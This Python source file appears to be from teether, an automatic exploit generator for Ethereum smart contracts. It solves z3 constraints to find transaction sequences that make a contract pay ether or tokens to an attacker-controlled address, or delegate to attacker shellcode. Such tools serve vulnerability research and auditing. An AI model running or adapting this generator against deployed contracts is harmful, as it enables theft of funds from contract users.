import itertools
import logging
from collections import defaultdict

from z3 import z3

from teether.cfg import opcodes
from teether.constraints import check_model_and_resolve, model_to_calls
from teether.evm.exceptions import IntractablePath
from teether.evm.results import CombinedSymbolicResult
from teether.util.z3_extra_util import concrete

import json

class InfeasibleExploit(Exception):
    pass


class ExploitContext(object):
    def __init__(self, target_addr, shellcode_addr, target_amount, amount_check, initial_balance, initial_storage,
                 controlled_addrs=set()):
        self.target_addr = target_addr
        self.shellcode_addr = shellcode_addr
        self.target_amount = target_amount
        self.amount_check = amount_check
        self.initial_balance = initial_balance
        self.initial_storage = initial_storage

        # assume we control the target address
        self.controlled_addrs = controlled_addrs | {target_addr}


def exploit_constraints_log3(r, ctx):

    sig_hash, s_addr, t_addr = r.state.stack[-3], r.state.stack[-4], r.state.stack[-5]
    if not concrete(sig_hash):
        sig_hash = z3.simplify(sig_hash)
    if not concrete(t_addr):
        t_addr = z3.simplify(t_addr)
    if not concrete(s_addr):
        s_addr = z3.simplify(s_addr)

    extra_constraints = []

    # for now just check if is keccak256('Transfer(address,address,uint256)')
    if not concrete(sig_hash):
        extra_constraints.append(sig_hash == 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef)
    else:
        if sig_hash != 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef:
            raise InfeasibleExploit

    if not concrete(t_addr):
        extra_constraints.append(z3.Extract(159,0,t_addr) == ctx.target_addr)
    else:
        if t_addr != ctx.target_addr:
            raise InfeasibleExploit

    # We only care about tokens from addresses different to ours
    if not concrete(s_addr):
        extra_constraints.append(z3.Extract(159,0,s_addr) != ctx.target_addr)
    else:
        if s_addr == ctx.target_addr:
            raise InfeasibleExploit

    mstart, msz = r.state.stack[-1], r.state.stack[-2]
    mm = [r.state.memory[mstart + i] for i in range(msz)]
    if not all(concrete(m) for m in mm):
        amount = z3.simplify(z3.Concat([m if not concrete(m) else z3.BitVecVal(m, 8) for m in mm]))
        if ctx.amount_check == '+':
            extra_constraints.append(z3.UGE(amount, ctx.target_amount))
        elif ctx.amount_check == '-':
            extra_constraints.append(z3.UGT(amount, 0))
            extra_constraints.append(z3.ULE(amount, ctx.target_amount))
        elif not concrete(amount):
            extra_constraints.append(amount == ctx.target_amount)
        elif amount != ctx.target_amount:
            raise InfeasibleExploit

    for res in r.results:
        callvalue = z3.BitVec('CALLVALUE_%d' % res.xid, 256)
        extra_constraints.append(z3.ULE(callvalue, 0))

    return extra_constraints


def exploit_constraints_call(r, ctx):
    addr = r.state.stack[-2]
    if not concrete(addr):
        addr = z3.simplify(addr)

    amount = r.state.stack[-3]
    if not concrete(amount):
        amount = z3.simplify(amount)

    extra_constraints = []

    if not concrete(addr):
        extra_constraints.append(z3.Extract(159, 0, addr) == ctx.target_addr)
    else:
        if addr != ctx.target_addr:
            raise InfeasibleExploit

    if not concrete(amount):
        if ctx.amount_check == '+':
            extra_constraints.append(z3.UGE(amount, ctx.target_amount))
        elif ctx.amount_check == '-':
            extra_constraints.append(z3.UGT(amount, 0))
            extra_constraints.append(z3.ULE(amount, ctx.target_amount))
        else:
            extra_constraints.append(amount == ctx.target_amount)
        final_balance = r.state.balance
        extra_constraints.append(z3.ULE(amount, final_balance))

    # ensure we're not spending more for this exploit than we gain
    total_spent = None
    for res in r.results:
        callvalue = z3.BitVec('CALLVALUE_%d' % res.xid, 256)
        extra_constraints.append(z3.ULE(callvalue, 10 * (10 ** 18)))  # keep it semi-reasonable: at most 10 Eth per call
        if total_spent is None:
            total_spent = callvalue
        else:
            total_spent += callvalue

    extra_constraints.append(z3.ULT(total_spent, amount))

    # also, ensure the contract does not require a unreasonable start-balance (>100 Eth)
    if not ctx.initial_balance:
        start_balance = z3.BitVec('BALANCE_%d' % r.results[0].xid, 256)
        extra_constraints.append(z3.ULE(start_balance, 100 * (10 ** 18)))

    return extra_constraints


def exploit_constraints_callcode(r, ctx):
    addr = z3.simplify(r.state.stack[-2])

    extra_constraints = []

    if not concrete(addr):
        extra_constraints.append(z3.Extract(159, 0, addr) == ctx.shellcode_addr)
    else:
        if addr != ctx.shellcode_addr:
            raise InfeasibleExploit

    return extra_constraints


def exploit_constraints_delegatecall(r, ctx):
    addr = z3.simplify(r.state.stack[-2])

    extra_constraints = []

    if not concrete(addr):
        extra_constraints.append(z3.Extract(159, 0, addr) == ctx.shellcode_addr)
    else:
        if addr != ctx.shellcode_addr:
            raise InfeasibleExploit

    return extra_constraints


def exploit_constraints_selfdestruct(r, ctx):
    addr = z3.simplify(r.state.stack[-1])

    extra_constraints = []

    if not concrete(addr):
        extra_constraints.append(z3.Extract(159, 0, addr) == ctx.target_addr)
    else:
        if addr != ctx.target_addr:
            raise InfeasibleExploit

    return extra_constraints


EXPLOIT_CONSTRAINTS = {
    'LOG3': exploit_constraints_log3,
    'CALL': exploit_constraints_call,
    'CALLCODE': exploit_constraints_callcode,
    'DELEGATECALL': exploit_constraints_callcode,
    'SELFDESTRUCT': exploit_constraints_selfdestruct
}


def get_exploit_constraints(r, ctx):
    target_op = r.results[-1].target_op
    if target_op in EXPLOIT_CONSTRAINTS:
        return EXPLOIT_CONSTRAINTS[target_op](r, ctx)
    else:
        return []

def control_address_constraints(sym_addr, controlled_addrs):
    sub_exprs = [sym_addr == controlled_addr for controlled_addr in controlled_addrs]
    expr = sub_exprs[0]
    for sub_expr in sub_exprs[1:]:
        expr = z3.Or(expr, sub_expr)
    return expr

def attempt_exploit(results, ctx, symbolic_run=False):
    c = CombinedSymbolicResult()
    for r in results[::-1]:
        c.prepend(r)
    c.combine(ctx.initial_storage, ctx.initial_balance, symbolic_run=symbolic_run)
    c.simplify()
    extra_constraints = get_exploit_constraints(c, ctx)

    for res in c.results:
        origin = z3.BitVec('ORIGIN_%d' % res.xid, 256)
        caller = z3.BitVec('CALLER_%d' % res.xid, 256)
        # ensure we control the origin
        extra_constraints.append(control_address_constraints(origin, ctx.controlled_addrs))
        # and ensure the caller is either the origin or the shellcode address
        extra_constraints.append(control_address_constraints(caller, {origin, ctx.shellcode_addr}))

    try:
        model = check_model_and_resolve(c.constraints + extra_constraints, c.sha_constraints)

        # enforce we control all ORIGIN-addresses
        if any(model[v].as_long() not in ctx.controlled_addrs for v in model if v.name().startswith('ORIGIN')):
            raise InfeasibleExploit

        if symbolic_run:
            addresses = list(set(filter(lambda x: x not in ctx.initial_storage,
                map(lambda x : model.eval(model[x]).as_long(),
                filter(lambda x: x.name().split('_')[0] in 'SLOAD', model)))))

            # if SLOADs are only performed on already checked storage
            # addresses the symbolic storage should not matter?
            if not addresses:
                return model_to_calls(model, c.idx_dict), c, model

            update_storage(addresses, ctx.initial_storage)

            return attempt_exploit(results, ctx, symbolic_run=False)

        else:
            return model_to_calls(model, c.idx_dict), c, model

    except IntractablePath:
        raise InfeasibleExploit

def update_storage(addresses, initial_storage):
    for x in addresses:
        if x == 0x7e5c57bfb7ee715f63638363f3fdcb1b75ba4eb532bc596283d0727670711be6:
            initial_storage[x] = 1000000
        else:
            initial_storage[x] = 0

def combined_exploit(p, target_addr, shellcode_addr, target_amount, amount_check='+', initial_storage=dict(),
                     initial_balance=None,
                     max_calls=3, controlled_addrs=set(), flags=None, storage_output=None):

    symbolic_run = storage_output is not None

    indirect_run = flags == {'CALL'}

    flags = flags or set(opcodes.CRITICAL)

    ctx = ExploitContext(target_addr, shellcode_addr, target_amount, amount_check, initial_balance, initial_storage,
                         controlled_addrs)

    try:
        sload_bbs = {ins.bb.start for ins in p.cfg.filter_ins('SLOAD')}

        critical_paths = []

        for op in opcodes.CRITICAL:
            if op not in flags:
                continue
            ins = p.cfg.filter_ins(op)
            if not ins:
                logging.info('No %s instructions', op)
                continue
            logging.info('Found %d %s instructions', len(ins), op)
            if indirect_run:
                constraints =  p.get_constraints(ins, find_memory=True)
            else:
                constraints = p.get_constraints(ins, opcodes.CRITICAL_ARGS[op])
            for i, i_path, i_r in constraints:
                logging.info("%s: %s", op, i)
                logging.info("Path: %s", '->'.join('%x' % p for p in i_path))
                if set(i_path) & sload_bbs:
                    # if there is a SLOAD on this path,
                    # it might benefit from prepending a state-changing path later
                    critical_paths.append(i_r)
                try:
                    return attempt_exploit([i_r], ctx, symbolic_run=symbolic_run)
                except InfeasibleExploit:
                    continue

        if not critical_paths:
            logging.warning("No state-dependent critical path found, aborting")
            return

        end_ins = p.cfg.filter_ins('RETURN') + p.cfg.filter_ins('STOP')
        if not end_ins:
            logging.info('No RETURN or STOP instructions')
            return
        logging.info('Found %d RETURN and STOP instructions', len(end_ins))
        compatible = defaultdict(lambda: [[]])  # list of lists
        state_changing_paths = []
        for i, (end, end_path, state_changing_r) in enumerate(p.get_constraints(end_ins, find_sstore=True)):
            logging.info("End: %s", end)
            logging.info("Path: %s", '->'.join('%x' % p for p in end_path))
            state_changing_paths.append(state_changing_r)
            for j, critical_r in enumerate(critical_paths):
                if not critical_r.may_read_from(state_changing_r):
                    continue
                compatible[j][0].append(i)
                try:
                    return attempt_exploit([state_changing_r, critical_r], ctx, symbolic_run=symbolic_run)
                except InfeasibleExploit:
                    continue

        logging.info('All ends: %s', state_changing_paths)

        storage_compatible = defaultdict(list)
        for (i, a_r), (j, b_r) in itertools.product(enumerate(state_changing_paths), enumerate(state_changing_paths)):
            if a_r.may_read_from(b_r):
                storage_compatible[i].append(j)

        calls = [state_changing_paths]
        while len(calls) < max_calls - 1:
            new_ends = [r.copy() for r in state_changing_paths]
            calls.append(new_ends)
            for k, v in compatible.items():
                new_compat = set()
                for c in v[-1]:
                    new_compat.update(storage_compatible[c])
                v.append(sorted(new_compat))
            for i, critical_r in enumerate(critical_paths):
                for combo_ids in itertools.product(*compatible[i]):
                    combo = [critical_r] + [c[j] for c, j in zip(calls, combo_ids)]
                    try:
                        return attempt_exploit(combo[::-1], ctx, symbolic_run=symbolic_run)
                    except InfeasibleExploit:
                        continue

        logging.info('Could not exploit any RETURN+CALL')
    finally:
        if symbolic_run:
            with open(storage_output, 'w') as f:
                json.dump({hex(k): hex(v) for k, v in ctx.initial_storage.items()}, f)

